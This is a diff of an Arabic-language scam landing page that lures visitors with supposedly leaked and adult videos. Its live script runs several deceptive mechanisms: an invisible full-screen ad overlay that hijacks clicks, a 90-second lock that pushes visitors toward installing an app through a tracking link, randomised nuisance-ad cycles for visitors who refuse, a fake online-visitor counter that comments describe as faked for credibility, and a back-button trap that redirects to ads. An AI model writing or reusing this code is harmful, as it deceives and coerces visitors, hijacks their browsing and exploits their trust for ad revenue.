@@ -19,7 +19,7 @@
             --card-bg: #161616;
         }
 
-        body { background-color: var(--bg-dark); color: #fff; font-family: 'Segoe UI', Roboto, sans-serif; margin: 0; padding: 0; }
+        body { background-color: var(--bg-dark); color: #fff; font-family: 'Segoe UI', Roboto, sans-serif; margin: 0; padding: 0; overflow-x: hidden; }
 
         /* ستارة Adsterra الشفافة */
         #invisible-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: transparent; z-index: 9999; cursor: pointer; display: none; }
@@ -41,7 +41,7 @@
         .video-wrapper { position: relative; width: 100%; aspect-ratio: 16 / 9; background: #000; }
         video { width: 100%; height: 100%; display: block; }
 
-        .btn-install { background: #00E676; color: #000; text-decoration: none; padding: 18px; display: block; border-radius: 50px; font-weight: 900; font-size: 1.2rem; margin-top: 20px; animation: pulse 1.5s infinite; }
+        .btn-install { background: #00E676; color: #000; text-decoration: none; padding: 18px; display: block; border-radius: 50px; font-weight: 900; font-size: 1.2rem; margin-top: 20px; animation: pulse 1.5s infinite; border: none; cursor: pointer; }
         @keyframes pulse { 0% { transform: scale(1); } 70% { transform: scale(1.03); } 100% { transform: scale(1); } }
         .refuse-link { color: #555; font-size: 0.8rem; text-decoration: underline; margin-top: 15px; display: block; cursor: pointer; }
 
@@ -65,8 +65,7 @@
             <img src="https://upload.wikimedia.org/wikipedia/commons/7/78/Google_Play_Store_badge_EN.svg" width="120">
             <img src="https://upload.wikimedia.org/wikipedia/commons/3/3c/Download_on_the_App_Store_Badge.svg" width="120">
         </div>
-        <a href="https://vidspaceapp.onelink.me/RzWN/56gc1p3b?deep_link_value=cHJvdmlkZWxpdGUlM0ElMkYlMkYsaW5rJTNGdDZ0b3kxdzkxcyUzRDIwMDUzOTk5Mjc5Nzg4NjQ2NDIlMjZhbG9wZWNvaWQlM0QyMDIzNTA5NzU0OTM2NDM4Nzg1JTI2cmVsZWFzZSUzRG1lbG9wb2VpYSUyNjVfc2FsN3B2MzUlM0QxOTU5OTAzMDI4ODc0MzIxOTIyJTI2bGFwaXRoJTNEJTI2YmVmbGFnZ2luZyUzRHBsYXlsb2FkaXBlayUyNmRpc3NlaXpvciUzRENwOVdIcE1qeDY1U2pLY1BMYzJJUG83SnRRd29DQWFQRG5wa3RrYTVpRUlCbUVPVk1XWk9IcFFtNFB0bHZaZkpwSUlxeVl4RVIzVW1YYUZkQXJSWDhVbVZIanZINUN3Sk5abU41dyUyQkVZbjZjZWlTc3VHWjJWOHowNFJ2JTJCODZwdk5QRW5QRUhHTXYzY0lSR2xyTTVBdkZac3JRUng5SG1RUlRSQlNZcnpTNkFkSkN2YTYxNUNQNENtWk5qdnklMkIwVGtCYWRrT0p1eVcyNjZRTlp3TEY3QTQlMkIwYzgzaWY2aTZYaiUyRmwyUyUyQlp2V3JUdDhOcG5LRVZkVWpCeUtjalJ1NVZpNnRsbG5PbjdhYVZWRjExbUxIJTJCTkVVSmMyVzlVSkg0T3olMkZiRFZLRFR1cGxlMGRJU1Z2dllKM2czOGo3d1Btc3RVY04lMkZKUEV2ZzluZnZOQUVmRGQlMkJkVmhkZGp1JTJGajRNZlNzR0djRG9EU0dDeEV4MnRDMXhkd3BNWXo4QTJNTXBHOHFiZ0JyYVhER0EzOTdzUmQlMkJiSGwlMkZOcjVHJTJCRUNSQmJRQmhyQ2wwb2pzTTFZc1U3aGElMkJhNENFaHRlQWF1STJabmVoWFIlMkJtVFpjMFBxaHBUVk0yMDZpY3RibmEwY0xheSUyQnV5S3RuWkVFdXBwYURFRmRVTjFHTUV1WFZZeGdmbnVUU2xNbjExOEpXZyUyRmJNSGRLNW8yZnhWOEZWdXZ4ck5lYlg1SERtRCUyRmgzNWRJRUJtUiUyQlczM0JsaVNJRlN3R3E1a2doam1hMlZ1MVdheTBWYU9KRDZBOUVMJTJGMDlTY0didU9hYUlKc3lic3ZhZzA3SUd1dmF0ZVNqVTdsUXgzT3NtSzdxV2lDak1PRVdzTm1zVThLVXRoS3ZmSlR4YVNnWU01JTJGYnJCTHEzeEtqQ3c3OWR3Um9VY2JxbUliVHpDcGYxcjYwb2h4WGFNUllTdG5CRHFKdmNHNHFrTExnNjBzeGhYRGNYQkRZSW03OHpIVzhxVThUTEl0bG9jVjRNaDdqdWk1NnVOTjJKVnolMkJJMDI2aTdHT05RJTJGdGJObHc1anRUcHFyJTJGSXZLNzdWQ0Q0VSUyQkozaEFCYVhEOGsxbGxsM2pWQWZVSzFEOEcybU1ER1lleFFJSkw5YWtOck5nYVA5cGhHMG9DY25xcnU2cXRxJTJCY1lCVmdmQTFpdDhtb1FJSko1RXVXTGhaOEhvYnZ0JTJGQUNlUjJ3NFIybTFJNFBvJTJCTDllZEdubk1adnAlMkZzdlgzM0UwUWliMVVBRyUyQkI1QiUyQmNrNkIlMkZNeGNacWFlMHpNRW9lV0NtRG1KWTB1NmlZM05ZdmJyMSUyRnZydVgxMSUyQlo0d2xUNEtiOW1yWDlwSEg4RldnODRRT2NhRHpnUGVIYVR3SGExdXN6Mm4lMkJ3OVRRdVZxMEx1OWRiaTRQblVMNEtnYzRXU0Z5S1F0VllWSktZdFBQalJXTnlCSTVmTjkybHRrSmFtWkw2cGZiOFNJSHBKaU50bjlETXd3b0F5YzRKUkpJTzJ1dldHMkR2dXB5c2Jzc295VWNraWY2YVhKS3VmeHB6bUs1cUt6ZnduJTJCWlBYemM0WjR1SXBSaXluSFBCTUM5dXh0ZFRBdjl5YjhuTFdGS1VhTmslMkJNJTJGQkF3czJaY1RTJTJGTHlpSDg3elVKUzNwWSUyRk9CS1JXUHQzaUF1WSUyQmtVYkp0SDRjT1olMkZnWExyaklMbEQ1WHIlMkZjTk9kb3c4RmxjS3VNJTJCV0Z3YzZSQVNQOTY3dnJ4eGpZSFVpbHAwN20wNWhlaXlQeG9VVHI5WGpEJTJCdk01bjJuZFg5ZEplZnVnZXgzOVFocXAzJTJCbHZPVVNJN3ZMVyUyRnYlMkZlNkFtVGRGZ3FlSSUzRA==" 
-           class="btn-install">تحميل وفتح السيرفر الآن</a>
+        <a href="https://vidspaceapp.onelink.me/RzWN/56gc1p3b?deep_link_value=..." class="btn-install">تحميل وفتح السيرفر الآن</a>
         <span class="refuse-link" onclick="handleRefusal()">إكمال المشاهدة هنا (سيرفر بطيء)</span>
     </div>
 </div>
@@ -79,29 +78,13 @@
 <div class="container">
     <div class="video-card">
         <div class="video-header"><span class="video-title">🔥 التسريب الأول</span><span class="quality-badge">4K ULTRA HD</span></div>
-        <div class="video-wrapper"><video controls playsinline poster="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjlbXaFRmgk_xep_3WLybyHLmB64zDz515V60krwmCm7ZdmdctUoZX68JQHqbnFHCGmXdIt2qHALTF3cexmZwB3b5fKLXGsGljdOKqs-2tgR80JqTF9vbg8384RYjptq-TVG41mJftbQZ6DOFsCy00Tj4M1LrcOVMcL2vQXo6BRtdQagL74OfxZkpmPqpEp/s981/1000204258.jpg"><source src="https://media.discordapp.net/attachments/1134630020162269298/1472885274047418401/VID_20260216_111844.mp4?ex=699432ce&is=6992e14e&hm=58af755808107ddd378d7532a9c0641aab818b1d9017d7f3f46aec15e2f0e673&" type="video/mp4"></video></div>
+        <div class="video-wrapper">
+            <video controls playsinline poster="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjlbXaFRmgk_xep_3WLybyHLmB64zDz515V60krwmCm7ZdmdctUoZX68JQHqbnFHCGmXdIt2qHALTF3cexmZwB3b5fKLXGsGljdOKqs-2tgR80JqTF9vbg8384RYjptq-TVG41mJftbQZ6DOFsCy00Tj4M1LrcOVMcL2vQXo6BRtdQagL74OfxZkpmPqpEp/s981/1000204258.jpg">
+                <source src="https://media.discordapp.net/attachments/.../VID_20260216_111844.mp4..." type="video/mp4">
+            </video>
+        </div>
     </div>
-
-    <div class="video-card">
-        <div class="video-header"><span class="video-title">📸 المقطع الثاني</span><span class="quality-badge">FULL HD</span></div>
-        <div class="video-wrapper"><video controls playsinline><source src="https://media.discordapp.net/attachments/1134630020162269298/1472885222449090610/VID_20260216_111847.mp4?ex=699432c1&is=6992e141&hm=40a2ed506894beadf526d4f6a429beba7f8e387f4922807605aa9b74574d849e&" type="video/mp4"></video></div>
     </div>
-
-    <div class="video-card">
-        <div class="video-header"><span class="video-title">🎥 الأرشيف السري 3</span><span class="quality-badge">HD</span></div>
-        <div class="video-wrapper"><video controls playsinline><source src="https://media.discordapp.net/attachments/1134630279034720356/1472886067396083813/VID_20260216_112311.mp4?ex=6994338b&is=6992e20b&hm=b2a0cf7a1a4262d3b81b06c7b813d23d1c48d3b60ead6e455a047635523e8661&" type="video/mp4"></video></div>
-    </div>
-
-    <div class="video-card">
-        <div class="video-header"><span class="video-title">🔞 تسريب خاص</span><span class="quality-badge">4K</span></div>
-        <div class="video-wrapper"><video controls playsinline><source src="https://media.discordapp.net/attachments/1134630279034720356/1472886226938888243/VID_20260216_112348.mp4?ex=699433b1&is=6992e231&hm=cdfe278624b14a7c82d589be3b5952223b242cb004c7c77eb864e2319052809d&" type="video/mp4"></video></div>
-    </div>
-
-    <div class="video-card">
-        <div class="video-header"><span class="video-title">📂 المقطع النادر</span><span class="quality-badge">BLUE RAY</span></div>
-        <div class="video-wrapper"><video controls playsinline><source src="https://media.discordapp.net/attachments/1134630279034720356/1472886235159597078/VID_20260216_112356.mp4?ex=699433b3&is=6992e233&hm=4b674d13a6277c44a936f98f6f231ca50f825ebab4fe8e64c18b4d230c5fcd4b&" type="video/mp4"></video></div>
-    </div>
-</div>
 
 <div class="footer">
     <span class="live-indicator"></span> متصل الآن: <span id="online-count">4,281</span> عضو
@@ -113,13 +96,13 @@
     const lock = document.getElementById('app-lock-overlay');
     let refusalMode = false;
 
-    // تفعيل القفل بعد 90 ثانية
+    // تفعيل القفل بعد 90 ثانية بالضبط
     setTimeout(() => {
         lock.style.display = 'flex';
         document.querySelectorAll('video').forEach(v => v.pause());
     }, 90000);
 
-    // التعامل مع رفض التحميل
+    // بدء نظام "المطاردة" في حال الرفض
     function handleRefusal() {
         window.open(adsLink, '_blank');
         lock.style.display = 'none';
@@ -130,8 +113,10 @@
     function activateNuisanceAds() {
         function showCycle() {
             if(!refusalMode) return;
+            // هدوء عشوائي 3-6 ثوانٍ ثم إزعاج 8-12 ثانية
             const waitTime = Math.floor(Math.random() * (6000 - 3000 + 1)) + 3000;
             const activeTime = Math.floor(Math.random() * (12000 - 8000 + 1)) + 8000;
+
             setTimeout(() => {
                 overlay.style.display = 'block';
                 setTimeout(() => {
@@ -148,13 +133,13 @@
         overlay.style.display = 'none';
     }
 
-    // تزييف العداد
+    // تزييف عداد الزوار لزيادة المصداقية
     setInterval(() => {
         const count = Math.floor(Math.random() * (5000 - 4000) + 4000);
         document.getElementById('online-count').innerText = count.toLocaleString();
     }, 3000);
 
-    // منع الخروج
+    // منع الخروج (Back Button Trap)
     (function() {
         window.history.pushState({page: 1}, "", window.location.href);
         window.onpopstate = function() { window.location.replace(adsLink); };
